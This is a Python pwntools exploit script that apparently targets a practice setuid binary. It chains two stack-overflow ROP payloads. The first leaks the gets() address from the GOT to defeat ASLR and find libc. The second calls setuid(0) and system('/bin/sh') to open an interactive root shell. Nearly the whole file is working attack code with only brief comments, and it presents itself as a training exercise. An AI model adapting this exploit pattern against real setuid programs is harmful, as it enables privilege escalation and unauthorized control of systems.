#!/usr/bin/env python3
from pwn import asm, context, ELF, log, p64, process, sys, u64


with open("/proc/sys/kernel/randomize_va_space", "r") as f:
    if f.readline().strip() != "2":
        log.error("Make sure ASLR is enabled!")

context.update(arch="amd64", os="linux")
target = "../binaries/simple-bo-rop-lazynopie-setuid"
binary = ELF(target)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
process = process(target)

# Stack smashing (str len + caller function's rbp, i.e., 8 bytes)
padding = b"A" * 0x10 + b"YADAYADA"

# ROP program:
# puts(gets)
#   -  main() again
# setuid(0)
# system("/bin/sh")

# Load gets() address in rdi stored in the GOT
payload = padding
payload += p64(next(binary.search(asm("pop rdi ; ret;"))))
payload += p64(binary.got.gets)
# gets() will return to puts() in PLT
payload += p64(binary.plt.puts)
# puts() will return to main(), in order to allow a second iteration
payload += p64(binary.symbols.main)

_ = process.recvline_containsS("What is your name?", timeout=3)

print("Injecting malicious input 1/2")
process.sendline(payload)
_ = process.recvline_containsS("Hello ", timeout=3)
# Receive the leaked address of gets()
text = process.recvline(timeout=3)
gets_address = u64(text.rstrip().ljust(8, b"\0"))

log.info(f"gets() address:   {hex(gets_address)}")
libc.address = gets_address - libc.symbols.gets
log.info(f"Libc base adress: {hex(libc.address)}")

# Load the address of '/bin/sh' in libc into rdi
payload = padding
payload += p64(next(libc.search(asm("pop rdi; ret;"))))
payload += p64(0)
payload += p64(libc.symbols.setuid)
payload += p64(next(libc.search(asm("pop rdi; ret;"))))
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.symbols.system)

print("Injecting malicious input 2/2")
process.sendline(payload)
_ = process.recvline_containsS("Hello ", timeout=3)

process.clean()
process.interactive()
